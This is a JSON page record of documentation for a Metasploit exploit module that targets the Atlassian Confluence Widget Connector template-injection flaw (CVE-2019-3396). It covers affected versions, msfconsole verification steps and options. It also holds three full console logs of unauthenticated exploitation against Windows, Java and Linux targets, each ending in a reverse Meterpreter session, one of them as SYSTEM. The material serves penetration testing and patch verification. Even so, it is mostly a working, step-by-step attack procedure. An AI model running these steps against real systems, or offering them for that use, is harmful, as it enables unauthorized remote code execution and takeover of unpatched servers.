{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/confluence_widget_connector","result":{"data":{"moduleMetadataJson":{"id":"482277b1-4674-532c-97b7-579fcb527c17","name":"Atlassian Confluence Widget Connector Macro Velocity Template Injection","fullname":"exploit/multi/http/confluence_widget_connector","description":"Widget Connector Macro is part of Atlassian Confluence Server and Data Center that\n        allows embed online videos, slideshows, photostreams and more directly into page.\n        A _template parameter can be used to inject remote Java code into a Velocity template,\n        and gain code execution. Authentication is unrequired to exploit this vulnerability.\n        By default, Java payload will be used because it is cross-platform, but you can also\n        specify which native payload you want (Linux or Windows).\n\n        Confluence before version 6.6.12, from version 6.7.0 before 6.12.3, from version\n        6.13.0 before 6.13.3 and from version 6.14.0 before 6.14.2 are affected.\n\n        This vulnerability was originally discovered by Daniil Dmitriev\n        https://twitter.com/ddv_ua.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/confluence_widget_connector","documentationSlug":"/modules/documentation/exploit/multi/http/confluence_widget_connector","referencesSlug":"/modules/references/exploit/multi/http/confluence_widget_connector"},"documentation":{"html":"<h1 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h1>\n<p>This module exploits a Velocity Template Injection in Atlassian Confluence Widget Connector Macro before 6.14.2 to execute arbitrary code (CVE-2019-3396). No authentication is required to exploit this vulnerability.</p>\n<p>The vulnerability exists in the Widget Connector Macro which allow inject the \"_template\" from the outside for some services, such as Youtube, Viddler, DailyMotion, etc.</p>\n<p>The module has been tested with on Atlassian Confluence 6.6.12, 6.8.2, 6.12.0 and 6.13.0 using Java, Windows and Linux meterpreter payload.</p>\n<p>References:\n<a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-3396\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-3396</a>\n<a href=\"https://confluence.atlassian.com/doc/confluence-security-advisory-2019-03-20-966660264.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://confluence.atlassian.com/doc/confluence-security-advisory-2019-03-20-966660264.html</a></p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Affecting Atlassian Confluence before version 6.6.12, from version 6.7.0 before 6.12.3, from version 6.13.0 before 6.13.3 and from version 6.14.0 before 6.14.2.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ul>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Setting up a working installation of Atlassian Confluence before 6.6.13, 6.12.3, 6.12.3 or 6.14.2.</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Start <code class=\"language-text\">msfconsole</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">use exploit/multi/http/confluence_widget_connector</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">set RHOST &lt;IP&gt;</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">set RPORT &lt;PORT&gt;</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">set SRVHOST &lt;HOST_IP&gt;</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">check</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> You should see <code class=\"language-text\">The target is vulnerable</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> <code class=\"language-text\">exploit</code></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> You should get a meterpreter session.</li>\n</ul>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<ul>\n<li><strong>TARGETURI</strong>: Path to Atlassian Confluence installation (\"/\" is the default)</li>\n<li><strong>TRIGGERURL</strong>: Url to external video service to trigger vulnerability (\"<a href=\"https://www.youtube.com/watch?v=kxopViU98Xo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.youtube.com/watch?v=kxopViU98Xo</a>\" is the default)</li>\n</ul>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h2 id=\"tested-on-confluence-682-with-windows-target\" style=\"position:relative;\"><a href=\"#tested-on-confluence-682-with-windows-target\" aria-label=\"tested on confluence 682 with windows target permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tested on Confluence 6.8.2 with Windows target</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/http/confluence_widget_connector\nmsf5 exploit(multi/http/confluence_widget_connector) &gt; set RHOST target.com\nRHOST =&gt; target.com\nmsf5 exploit(multi/http/confluence_widget_connector) &gt; set RPORT 8090\nRPORT =&gt; 8090\nmsf5 exploit(multi/http/confluence_widget_connector) &gt; set SRVHOST 192.168.0.1\nSRVHOST =&gt; 192.168.0.1\nmsf5 exploit(multi/http/confluence_widget_connector) &gt; set TARGET Windows\nTARGET =&gt; Windows\nmsf5 exploit(multi/http/confluence_widget_connector) &gt; check\n[*] target.com:8090 - Starting the FTP server.\n[*] target.com:8090 - Started service listener on 192.168.0.1:8021\n[+] target.com:8090 - The target is vulnerable.\n[*] target.com:8090 - Server stopped.\nmsf5 exploit(multi/http/confluence_widget_connector) &gt; exploit\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n[*] Started reverse TCP handler on 192.168.0.1:4444\n[*] target.com:8090 - Starting the FTP server.\n[*] target.com:8090 - Started service listener on 192.168.0.1:8021\nmsf5 exploit(multi/http/confluence_widget_connector) &gt;\n[*] target.com:8090 - Target being detected as: Windows 10\n[*] target.com:8090 - Attempting to upload C:\\PROGRA~1\\Atlassian\\Confluence\\temp\\gAdGh.exe\n[*] target.com:8090 - Attempting to copy payload to C:\\PROGRA~1\\Atlassian\\Confluence\\temp\\MRuDb.exe\n[*] target.com:8090 - Attempting to execute C:\\PROGRA~1\\Atlassian\\Confluence\\temp\\MRuDb.exe\n[*] Sending stage (179779 bytes) to target.com\n[*] Meterpreter session 1 opened (192.168.0.1:4444 -&gt; target.com:62528) at 2019-04-11 03:13:37 +0000\n[*] target.com:8090 - Waiting for exploit to complete...\n[!] This exploit may require manual cleanup of &#39;C:\\PROGRA~1\\Atlassian\\Confluence\\temp\\FFDBo.exe&#39; on the target\n[!] This exploit may require manual cleanup of &#39;C:\\PROGRA~1\\Atlassian\\Confluence\\temp\\JLzIZ.exe&#39; on the target\n[*] target.com:8090 - Server stopped.\nmsf5 exploit(multi/http/confluence_widget_connector) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; quit\n[*] Shutting down Meterpreter...\n\n[*] target.com - Meterpreter session 1 closed.  Reason: User exit\nmsf5 exploit(multi/http/confluence_widget_connector) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"tested-on-confluence-682-with-java-target\" style=\"position:relative;\"><a href=\"#tested-on-confluence-682-with-java-target\" aria-label=\"tested on confluence 682 with java target permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tested on Confluence 6.8.2 with Java target</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/http/confluence_widget_connector\nmsf5 exploit(multi/http/confluence_widget_connector) &gt; set RHOST target.com\nRHOST =&gt; target.com\nmsf5 exploit(multi/http/confluence_widget_connector) &gt; set RPORT 8090\nRPORT =&gt; 8090\nmsf5 exploit(multi/http/confluence_widget_connector) &gt; set SRVHOST 192.168.0.1\nSRVHOST =&gt; 192.168.0.1\nmsf5 exploit(multi/http/confluence_widget_connector) &gt; check\n[*] target.com:8090 - Starting the FTP server.\n[*] target.com:8090 - Started service listener on 192.168.0.1:8021\n[+] target.com:8090 - The target is vulnerable.\n[*] target.com:8090 - Server stopped.\nmsf5 exploit(multi/http/confluence_widget_connector) &gt; exploit\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n[*] Started reverse TCP handler on 192.168.0.1:4444\n[*] target.com:8090 - Starting the FTP server.\n[*] target.com:8090 - Started service listener on 192.168.0.1:8021\nmsf5 exploit(multi/http/confluence_widget_connector) &gt;\n[*] target.com:8090 - Target being detected as: Linux\n[*] target.com:8090 - Attempting to upload  /opt/atlassian/confluence/temp/EjpPf.jar\n[*] target.com:8090 - Attempting to execute  /opt/atlassian/confluence/temp/EjpPf.jar\n[*] Sending stage (53866 bytes) to target.com\n[*] Meterpreter session 1 opened (192.168.0.1:4444 -&gt; target.com:55690) at 2019-04-11 03:13:37 +0000\n[+] target.com:8090 -Deleted /opt/atlassian/confluence/temp/EjpPf.jar\n[*] target.com:8090 - Waiting for exploit to complete...\n[*] target.com:8090 - Server stopped.\nmsf5 exploit(multi/http/confluence_widget_connector) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; getuid\nServer username: confluence\nmeterpreter &gt; quit\n[*] Shutting down Meterpreter...\n\n[*] target.com - Meterpreter session 1 closed.  Reason: User exit\nmsf5 exploit(multi/http/confluence_widget_connector) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"tested-on-confluence-682-with-linux-target\" style=\"position:relative;\"><a href=\"#tested-on-confluence-682-with-linux-target\" aria-label=\"tested on confluence 682 with linux target permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tested on Confluence 6.8.2 with Linux target</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/multi/http/confluence_widget_connector\nmsf5 exploit(multi/http/confluence_widget_connector) &gt; set RHOST target.com\nRHOST =&gt; target.com\nmsf5 exploit(multi/http/confluence_widget_connector) &gt; set RPORT 8090\nRPORT =&gt; 8090\nmsf5 exploit(multi/http/confluence_widget_connector) &gt; set SRVHOST 192.168.0.1\nSRVHOST =&gt; 192.168.0.1\nmsf5 exploit(multi/http/confluence_widget_connector) &gt; check\n[*] target.com:8090 - Starting the FTP server.\n[*] target.com:8090 - Started service listener on 192.168.0.1:8021\n[+] target.com:8090 - The target is vulnerable.\n[*] target.com:8090 - Server stopped.\nmsf5 exploit(multi/http/confluence_widget_connector) &gt; exploit\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n[*] Started reverse TCP handler on 192.168.0.1:4444\n[*] target.com:8090 - Starting the FTP server.\n[*] target.com:8090 - Started service listener on 192.168.0.1:8021\nmsf5 exploit(multi/http/confluence_widget_connector) &gt;\n[*] target.com:8090 - Target being detected as: Linux\n[*] target.com:8090 - Attempting to upload /opt/atlassian/confluence/temp/BYHzD\n[*] target.com:8090 - Attempting to copy payload to /opt/atlassian/confluence/temp/dESMnt\n[*] target.com:8090 - Attempting to execute /opt/atlassian/confluence/temp/dESMnt\n[*] Sending stage (985320 bytes) to target.com\n[*] Meterpreter session 1 opened (192.168.0.1:4444 -&gt; target.com:55690) at 2019-04-11 03:13:37 +0000\n[+] target.com:8090 - Deleted /opt/atlassian/confluence/temp/BYHzD\n[+] target.com:8090 - Deleted /opt/atlassian/confluence/temp/dESMnt\n[*] target.com:8090 - Waiting for exploit to complete...\n[*] target.com:8090 - Server stopped.\nmsf5 exploit(multi/http/confluence_widget_connector) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; getuid\nServer username: uid=1001, gid=1001, euid=1001, egid=1001\nmeterpreter &gt; quit\n[*] Shutting down Meterpreter...\n\n[*] target.com - Meterpreter session 1 closed.  Reason: User exit\nmsf5 exploit(multi/http/confluence_widget_connector) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"482277b1-4674-532c-97b7-579fcb527c17"}}}